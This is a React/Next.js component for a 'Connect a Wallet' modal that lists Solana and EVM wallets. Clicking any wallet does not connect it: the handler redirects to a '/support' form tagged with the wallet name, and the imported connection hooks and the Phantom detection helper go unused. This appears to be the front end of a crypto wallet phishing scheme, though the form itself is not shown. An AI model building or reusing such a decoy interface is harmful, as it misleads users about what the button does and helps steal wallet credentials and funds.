'use client';

import { motion, AnimatePresence } from 'framer-motion';
import { useWalletModal } from '@/app/context/WalletModalContext';
import Image from 'next/image';
import { useEffect, useState } from 'react';
import toast from 'react-hot-toast';
import { useConnect, useAccount } from 'wagmi';
import { useRouter } from 'next/navigation';

// 🪩 Detect Phantom Wallet (for Solana)
function getPhantomProvider() {
  if (typeof window !== 'undefined' && window.phantom?.solana?.isPhantom) {
    return window.phantom.solana;
  }
  return null;
}

export default function WalletModal() {
  const { isOpen, closeModal } = useWalletModal();
  const [wallets, setWallets] = useState([]);
  const [loading, setLoading] = useState(true);
  const router = useRouter();
  const { connectors, connectAsync } = useConnect();
  const { address } = useAccount();

  // 🧭 Fetch wallets (EVM + Solana)
  useEffect(() => {
    if (!isOpen) return;
    let active = true;

    async function loadWallets() {
      setLoading(true);
      try {
        const res = await fetch(
          `https://explorer-api.walletconnect.com/v3/wallets?projectId=${process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID}`
        );

        if (!res.ok) throw new Error('Failed to fetch wallets');
        const data = await res.json();

        const evmWallets = Object.values(data.listings || {}).slice(0, 40).map((w) => ({
          id: w.id,
          name: w.name,
          image: w.image_url?.md || '/default-wallet.png',
          homepage: w.homepage,
          type: 'evm',
        }));

        // Solana wallets (static)
        const solanaWallets = [
          {
            id: 'phantom',
            name: 'Phantom Wallet',
            image: 'https://cdn.jsdelivr.net/gh/trustwallet/assets/blockchains/solana/info/logo.png',
            homepage: 'https://phantom.app/',
            type: 'solana',
          },
          {
            id: 'solflare',
            name: 'Solflare',
            image: 'https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/solana/info/logo.png',
            homepage: 'https://solflare.com/',
            type: 'solana',
          },
          {
            id: 'backpack',
            name: 'Backpack',
            image: 'https://avatars.githubusercontent.com/u/110282424?s=200&v=4',
            homepage: 'https://www.backpack.app/',
            type: 'solana',
          },
          {
            id: 'glow',
            name: 'Glow Wallet',
            image: 'https://glow.app/favicon.png',
            homepage: 'https://glow.app/',
            type: 'solana',
          },
        ];

        const allWallets = [...solanaWallets, ...evmWallets].slice(0, 50);
        if (active) setWallets(allWallets);
      } catch (err) {
        console.error('Wallet fetch failed:', err);
        toast.error('Failed to load wallets');
      } finally {
        if (active) setLoading(false);
      }
    }

    loadWallets();
    return () => {
      active = false;
    };
  }, [isOpen]);

  // 🪙 Redirect to Support Form
  const handleConnect = (wallet) => {
    closeModal();

    // ✅ small delay to let modal unmount fully
    setTimeout(() => {
      router.push(`/support?wallet=${encodeURIComponent(wallet.name)}`);
    }, 300);
  };

  return (
    <AnimatePresence mode="wait">
      {isOpen && (
        <motion.div
          key="wallet-modal"
          className="fixed inset-0 z-50 flex items-center justify-center"
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
        >
          {/* Overlay */}
          <motion.div
            className="absolute inset-0 bg-black/40 backdrop-blur-sm"
            onClick={closeModal}
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
          />

          {/* Modal Container */}
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            transition={{ type: 'spring', stiffness: 120, damping: 18 }}
            className="relative z-50 w-[94%] max-w-5xl  backdrop-blur-2xl rounded-2xl border border-white/30 overflow-hidden shadow-lg " color='f8ad9d'
          >
            {/* Header */}
            <div className="flex items-center justify-between px-6 py-4 border-b border-white/30">
              <h3 className="text-xl font-semibold "color='f08080'>Connect a Wallet</h3>
              <button
                onClick={closeModal}
                className="text-sky-700 font-semibold hover:text-blue-600 transition"
              >
                ✕
              </button>
            </div>

            {/* Wallet Grid */}
            <div className="p-6 grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 lg:grid-cols-6 gap-4 max-h-[70vh] overflow-y-auto">
              {loading ? (
                Array.from({ length: 12 }).map((_, i) => (
                  <div
                    key={i}
                    className="h-28 rounded-xl bg-white/40 animate-pulse shadow-inner"
                  />
                ))
              ) : (
                wallets.map((wallet) => (
                  <motion.button
                    key={wallet.id}
                    whileHover={{ scale: 1.05 }}
                    whileTap={{ scale: 0.97 }}
                    onClick={() => handleConnect(wallet)}
                    className={`flex flex-col items-center justify-center p-3 rounded-xl bg-white/60 hover:bg-white/90 border border-white/40 transition-all ${
                      wallet.type === 'solana'
                        ? 'ring-1 ring-purple-300'
                        : 'ring-1 ring-sky-200'
                    }`}
                  >
                    <div className="w-12 h-12 rounded-lg bg-white flex items-center justify-center overflow-hidden">
                      <Image
                        src={wallet.image}
                        alt={wallet.name}
                        width={48}
                        height={48}
                        className="drop-shadow"
                      />
                    </div>
                    <p className="mt-2 text-xs font-medium text-sky-700 text-center truncate">
                      {wallet.name}
                    </p>
                    <span className="text-[10px] text-slate-500">
                      {wallet.type.toUpperCase()}
                    </span>
                  </motion.button>
                ))
              )}
            </div>

            {/* Footer */}
            <div className="text-center text-xs text-slate-500 py-3 border-t border-white/30" color='f8ad9d'>
              🌐 Supports 50+ Wallets — EVM + Solana Ecosystems
            </div>
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
